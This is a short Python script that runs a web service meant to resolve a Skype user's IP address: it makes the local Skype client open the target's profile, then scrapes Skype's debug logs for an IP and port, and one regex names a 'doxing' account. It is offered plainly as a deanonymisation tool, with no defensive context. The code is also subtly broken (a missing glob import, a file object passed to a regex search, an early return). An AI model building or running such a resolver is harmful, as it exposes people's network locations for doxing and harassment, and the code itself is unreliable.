import json
import Skype4Py
import web
import time
import re

urls = (
    '/api/(.*)', 'resolve'
)

instance = Skype4Py.Skype()
instance.Attach()

def findIpAddresses(skype):
	ipAddresses = []
	logs = glob.glob('debug-*.log')
	print logs
	for log in logs:
		lol = re.findall(r".*PresenceManager:.*live:doxing_3.*0x.*-d-s[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}:[0-9]{1,}-r", open(log, 'r'))
		return lol

def writeToLog(skype, instance=instance):
	instance.Client.OpenUserInfoDialog(skype)
	#So we can resolve more than once
	instance.Client.Focus()
	instance.Client.Minimize()
	return True

class resolve:
    def GET(self, skype):
        writeToLog(skype)
	time.sleep(2)
	return findIpAddresses(skype)

if __name__ == "__main__":
    app = web.application(urls, globals())
    app.internalerror = web.debugerror
    app.run()
